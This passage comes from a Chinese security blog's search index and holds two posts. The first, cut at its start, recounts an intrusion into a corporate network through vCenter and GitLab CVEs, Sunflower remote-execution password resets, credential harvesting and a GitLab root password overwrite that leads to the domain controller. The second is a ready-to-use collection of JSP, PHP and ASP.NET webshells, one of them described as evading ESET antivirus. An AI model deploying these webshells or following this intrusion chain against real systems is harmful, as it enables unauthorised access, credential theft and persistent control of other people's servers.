alt="img"></p><p>18，打开这些共享文件夹，粗略得到以下战果：</p><p>19，内部办公oa系统超级管理员权限及源代码。</p><p><img src="/img/b1/b121.png" alt="img"></p><p>20，办公OA、app数据库权限以及服务器权限，通过提权进入服务器。</p><p><img src="/img/b1/b122.png" alt="img"></p><p>21、得到Vcenter管理控制台几个管理地址，经过测试发现存在<code>cve-2021-22005</code>，拿到服务器权限。</p><p><img src="/img/b1/b123.png" alt="img"></p><p>22、后来经过收集到的密码碰撞，碰撞出Vcenter控制台默认用户<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#x72;&#x61;&#116;&#x6f;&#114;&#64;&#118;&#115;&#x70;&#x68;&#x65;&#x72;&#x65;&#46;&#108;&#111;&#x63;&#97;&#108;">&#x61;&#100;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#x72;&#x61;&#116;&#x6f;&#114;&#64;&#118;&#115;&#x70;&#x68;&#x65;&#x72;&#x65;&#46;&#108;&#111;&#x63;&#97;&#108;</a>的密码，是一个内部人员使用频率比较高的一个弱口令密码。且发现所有Vcenter控制台的超管用户的密码都是这个。</p><p><img src="/img/b1/b124.png" alt="img"></p><p>23、其实到这一步，我已经拿到了vcenter控制台及服务器权限了，之前也有看过其他大佬发过的文章，拿到vcenter就拿到域控了，文章也就结束了。我这里也确实在vcenter找到了当前域控的机器，但是通过这个vcenter并不能直接登录服务器，还是要输入密码。所以我认为我并没搞到域控，继续深入了。</p><p>24、因为之前那个帖子说到在办公网打域控没搞到，所以就也不赘述了。讲下后续拿到域控的过程。</p><p>25、之前的帖子提到我利用到了<code>向日葵rce</code>，当时也是在获取到了真正办公网ip段后，想着扫描下，看有没有运维管理人员的向日葵没有升级中招的。先是利用论坛里一个师傅批量扫描工具，扫描了几个C段，然后再利用另外一个师傅的命令执行工具修改办公电脑administrator的密码。这样得到了几十个内部员工办公电脑权限。</p><p><img src="/img/b1/b125.png" alt="img"><img src="/img/b1/b126.png" alt="img"></p><p>26、后面晚上22点多通过虚拟桌面去远程这些办公电脑（下班时间，好做事），在一个应该是开发的电脑google浏览器发现了内部代码仓库gitlab地址。</p><p><img src="/img/b1/b127.png" alt="img"></p><p>27、发现当前这个gitlab存在<code>cve-2021-22205远程命令执行</code>。利用漏洞得到git权限后提权到root（提权这一步走错了，导致告警第二天被安全人员发现了，但是对后面没有大碍）。</p><p><img src="/img/b1/b128.png" alt="img"><img src="/img/b1/b129.png" alt="img"><img src="/img/b1/b130.png" alt="img"></p><p>28、执行命令cat &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb，查看配置信息，获取到数据库地址及用户名密码。</p><p><img src="/img/b1/b131.png" alt="img"></p><p>29、用数据库管理工具连接这个数据库，连接后在users表中查询root用户的信息，查看到密码的bcrypt加密信息，备份encrypted_password: $***********************(利用完好改回去)。</p><p><img src="/img/b1/b132.png" alt="img"></p><p>30、12345678的密文值为$2a$10$9sM0WeC3WSDCx9HWwr7z7eV3h3Q&#x2F;tPxP7G2kvCWxWqdJemid1lICa，执行如下sql命令，修改root用户的密码。</p><p><img src="/img/b1/b133.png" alt="img"></p><p>31、之后便是使用root&#x2F;12345678登录gitlab查看所有项目代码，后面查看项目代码名称，想试试看有没有关于域相关的运维脚本代码，搜索【AD域】发现有一个【AD域**系统】的项目，并且在该项目下面发现一个配置文件，得到一个数据库连接信息，并且猜测这个项目代码创建人可能管理域控的运维人员。</p><p><img src="/img/b1/b134.png" alt="img"><img src="/img/b1/b135.png" alt="img"></p><p>32、连接这个数据库，进入后翻找得到这个【AD域**系统】项目创建人的工号密码。用他的工号密码去尝试登录之前发现的堡垒机登录地址，堡垒机登录仍然有动态口令限制，继续app绕过验证得到这个工号的动态口令成功登录到堡垒机。</p><p><img src="/img/b1/b136.png" alt="img"><img src="/img/b1/b137.png" alt="img"></p><p>33、在他管理的资产中，顺利找到域控机器，登录进机器，至此到了心心念念域控服务器，后续就是进行权限维持了，这里也不在赘述了。</p><p><img src="/img/b1/b138.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 域控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用webshell</title>
      <link href="/2023/10/24/%E5%B8%B8%E7%94%A8webshell/"/>
      <url>/2023/10/24/%E5%B8%B8%E7%94%A8webshell/</url>
      
        <content type="html"><![CDATA[<p>一些常用的webshell，记录避免有时候找不着。</p><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h3 id="jsp一句话打印输出验证"><a href="#jsp一句话打印输出验证" class="headerlink" title="jsp一句话打印输出验证"></a>jsp一句话打印输出验证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(&quot;i am sircong&quot;);%&gt;</span><br></pre></td></tr></table></figure><blockquote><p>&lt;%out.println(“i am sircong”);%&gt;</p></blockquote><p><code>&lt;%out.println(&quot;i am sircong&quot;);%&gt;</code></p><h3 id="jsp蚁剑马，密码：passwd"><a href="#jsp蚁剑马，密码：passwd" class="headerlink" title="jsp蚁剑马，密码：passwd"></a>jsp蚁剑马，密码：passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$&lt;%!</span><br><span class="line">  class U extends ClassLoader &#123;</span><br><span class="line">    U(ClassLoader c) &#123;</span><br><span class="line">      super(c);</span><br><span class="line">    &#125;</span><br><span class="line">    public Class g(byte[] b) &#123;</span><br><span class="line">      return super.defineClass(b, 0, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">      return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">      Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">      Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">      return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class="line">  if (cls != null) &#123;</span><br><span class="line">    new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h3 id="基础一句话"><a href="#基础一句话" class="headerlink" title="基础一句话"></a>基础一句话</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval(@$_POST[&#x27;ST&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><p>&#96;&#96; code<br><?php @eval($_POST['pass']);?></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`` code</span><br><span class="line">&lt;?php @assert($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><h1 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h1><h3 id="ashx文件后缀，免杀eset，上传ashx马后，访问ashx马，会在webshell当前目录生成一个root-asp文件，使用菜刀连接root-asp，密码：root"><a href="#ashx文件后缀，免杀eset，上传ashx马后，访问ashx马，会在webshell当前目录生成一个root-asp文件，使用菜刀连接root-asp，密码：root" class="headerlink" title="ashx文件后缀，免杀eset，上传ashx马后，访问ashx马，会在webshell当前目录生成一个root.asp文件，使用菜刀连接root.asp，密码：root"></a>ashx文件后缀，免杀eset，上传ashx马后，访问ashx马，会在webshell当前目录生成一个root.asp文件，使用菜刀连接root.asp，密码：root</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebHandler Language=&quot;C#&quot; class=&quot;Handler&quot; %&gt;</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Web;</span><br><span class="line">using System.IO;</span><br><span class="line">public class Handler : IHttpHandler &#123;</span><br><span class="line"></span><br><span class="line">public void ProcessRequest (HttpContext context) &#123;</span><br><span class="line">context.Response.ContentType = &quot;text/plain&quot;;</span><br><span class="line"></span><br><span class="line">StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.asp&quot;));</span><br><span class="line">file1.Write(&quot;&lt;%response.clear:execute request(\&quot;root\&quot;):response.End%&gt;&quot;);</span><br><span class="line">file1.Flush();</span><br><span class="line">file1.Close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public bool IsReusable &#123;</span><br><span class="line">get &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ashx文件后缀，浏览器访问上传地址执行cmd命令"><a href="#ashx文件后缀，浏览器访问上传地址执行cmd命令" class="headerlink" title="ashx文件后缀，浏览器访问上传地址执行cmd命令"></a>ashx文件后缀，浏览器访问上传地址执行cmd命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;% @ webhandler language=&quot;C#&quot; class=&quot;AverageHandler&quot; %&gt;</span><br><span class="line">using System;</span><br><span class="line">using System.Web;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.IO;</span><br><span class="line"></span><br><span class="line">public class AverageHandler : IHttpHandler</span><br><span class="line">&#123;</span><br><span class="line">  /* .Net requires this to be implemented */</span><br><span class="line">  public bool IsReusable</span><br><span class="line">  &#123;</span><br><span class="line">   get &#123; return true; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* main executing code */</span><br><span class="line">  public void ProcessRequest(HttpContext ctx)</span><br><span class="line">  &#123;</span><br><span class="line">   Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + &quot;://&quot; + HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);</span><br><span class="line">   string command = HttpUtility.ParseQueryString(url.Query).Get(&quot;cmd&quot;);</span><br><span class="line"></span><br><span class="line">   ctx.Response.Write(&quot;&lt;form method=&#x27;GET&#x27;&gt;Command: &lt;input name=&#x27;cmd&#x27; value=&#x27;&quot;+command+&quot;&#x27;&gt;&lt;input type=&#x27;submit&#x27; value=&#x27;Run&#x27;&gt;&quot;);</span><br><span class="line">   ctx.Response.Write(&quot;&lt;hr&gt;&quot;);</span><br><span class="line">   ctx.Response.Write(&quot;&lt;pre&gt;&quot;);</span><br><span class="line"></span><br><span class="line">   /* command execution and output retrieval */</span><br><span class="line">   ProcessStartInfo psi = new ProcessStartInfo();</span><br><span class="line">   psi.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">   psi.Arguments = &quot;/c &quot;+command;</span><br><span class="line">   psi.RedirectStandardOutput = true;</span><br><span class="line">   psi.UseShellExecute = false;</span><br><span class="line">   Process p = Process.Start(psi);</span><br><span class="line">   StreamReader stmrdr = p.StandardOutput;</span><br><span class="line">   string s = stmrdr.ReadToEnd();</span><br><span class="line">   stmrdr.Close();</span><br><span class="line"></span><br><span class="line">   ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));</span><br><span class="line">   ctx.Response.Write(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">   ctx.Response.Write(&quot;&lt;hr&gt;&quot;);</span><br><span class="line">   ctx.Response.Write(&quot;By &lt; a href=&#x27; &#x27;&gt;@Hypn, for educational purposes only.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 快捷笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
